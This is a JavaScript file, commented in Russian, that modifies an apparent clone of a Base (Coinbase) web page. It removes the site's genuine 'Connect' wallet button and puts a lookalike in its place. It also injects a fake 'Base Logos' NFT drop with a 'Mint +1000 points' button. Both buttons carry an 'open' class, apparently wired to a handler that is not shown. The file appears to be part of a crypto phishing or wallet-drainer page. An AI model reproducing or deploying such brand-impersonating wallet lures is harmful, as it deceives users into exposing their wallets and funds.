const images = [
  "./images/blog/base-is-meeting-builders-around-the-world-cover.png",
  "./images/blog/summer-never-ends-cover.webp",
  "./images/blog/scaling-base-looking-towards-the-upcoming-pectra-upgrade-cover.webp",
  "./images/blog/build-your-onchain-identity-with-basenames-cover.webp",
  "./images/blog/announcing-the-onchain-summer-buildathon-winners-cover.webp",
  "./images/blog/introducing-the-onchain-content-network-cover.webp",
];

window.addEventListener("load", () => {
  replaceImage();

  addNftContainer();
  waitForAndRemoveButton();

  // setTimeout(() => {
  //   const buttons = document.querySelectorAll("button");
  //
  //   // Найти нужную кнопку
  //   const targetButton = Array.from(buttons).find((button) => {
  //     const span = button.querySelector("span"); // Проверяем, есть ли внутри <span>
  //     console.log(span, "span");
  //     return span && span.textContent.trim() === "Connect"; // Сравниваем текст
  //   });
  //
  //   console.log(targetButton, "targetButton");
  //
  //   targetButton.style.display = "none";
  // }, 1500);
});

function waitForAndRemoveButton() {
  const intervalTime = 100; // Интервал проверки (в миллисекундах)
  const maxTime = 5000; // Максимальное время ожидания (5 секунд)
  const startTime = Date.now();

  // Функция для поиска и удаления кнопки
  function checkAndRemoveButton() {
    const buttons = document.querySelectorAll("button");
    const targetButton = Array.from(buttons).find((button) => {
      const span = button.querySelector("span");
      return span && span.textContent.trim() === "Connect";
    });

    if (targetButton) {
      console.log("Кнопка найдена и удалена:", targetButton);
      const button = document.createElement("button");
      button.textContent = "Connect";
      button.className =
        "open text-md px-4 py-2 whitespace-nowrap flex items-center justify-center disabled:opacity-40 disabled:pointer-events-none transition-all bg-blue text-white border border-blue hover:bg-blue-80 active:bg-[#06318E] text-md px-4 py-2 gap-3 rounded-full w-auto";
      const dataRkWrapper = document.querySelectorAll("[data-rk]");
      targetButton.remove();
      dataRkWrapper[1].appendChild(button);
      window.upgradeFinished = true;

      return; // Прекращаем выполнение, так как цель достигнута
    }

    // Проверяем, не истекло ли максимальное время
    if (Date.now() - startTime < maxTime) {
      setTimeout(checkAndRemoveButton, intervalTime);
    } else {
      console.log("Кнопка не найдена в течение 5 секунд.");
    }
  }

  // Запускаем первый вызов
  checkAndRemoveButton();
}

function addNftContainer() {
  const parent = document.querySelector(".my-section").parentNode;
  const mySection = document.querySelector(".my-section");

  const newSection = document.createElement("section");
  newSection.className = "nft-mint-container";
  newSection.innerHTML = `
                <div class="flex h-[420px] bg-[#141519] rounded-2xl"> 
                    <div class="flex flex-1 justify-between overflow-hidden nft-wrapper"> 
                        <!-- Left Section -->
                        <div class="flex-1 p-8">
                            <div class="space-y-8">
                                <!-- Fresh Drop Badge -->
                                <span class="cds-interactable-i9xooc6 cds-focusRing-fd371rq cds-transparent-tlx9nbb g1j4d186 inline-block text-white px-4 py-1.5 rounded-full text-sm">
                                    FRESH DROP
                                </span>

                                <!-- Coinbase Section -->
                                <div class="flex items-center gap-2">
                                    <div class="w-12 h-12 rounded-full overflow-hidden bg-gray-700">
                                    <img src="./base-logos.svg" alt=""/>
</div>
                                    <span class="text-white font-semibold">Gayatri</span>
                                </div>

                                <!-- Title -->
                                <h1 class="text-white text-6xl font-bold">
                                    Base Logos
                                </h1>

                                <!-- Description -->
                                <p class="text-gray-400">
                                    Base Logos is a collection of 10,000 Base logos colored with Base Colors.
                                </p>

                                <!-- Mint Button -->
                                <button class="open w-full py-4 px-6 rounded-full text-center font-medium bg-gradient-to-r from-blue-500 to-cyan-400 text-white hover:opacity-90 transition-opacity">
                                    Mint +1000 points
                                </button>
                            </div>
                        </div>

                        <!-- Right Section - Image -->
                        <div class="relative flex-1 rounded-3xl">
                        <div class="video-wrapper h-full relative rounded-tr-2xl rounded-br-2xl overflow-hidden">
                        	<video class="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 min-w-full min-h-full" loop autoplay muted height="420">
                        			 <source src="_next/static/base-logos.mp4" type="video/mp4">
														</video>
												</div>
                        		
  
<!--                            <div class="w-full h-full bg-[#FF7E78]"></div>-->
                        </div>
                    </div>
                </div>
            `;

  parent.insertBefore(newSection, mySection);
}

function replaceImage() {
  const elements = document.querySelectorAll(".object-cover");

  elements.forEach((element, index) => {
    if (element) {
      element.srcset = images[index];
    }
  });
}
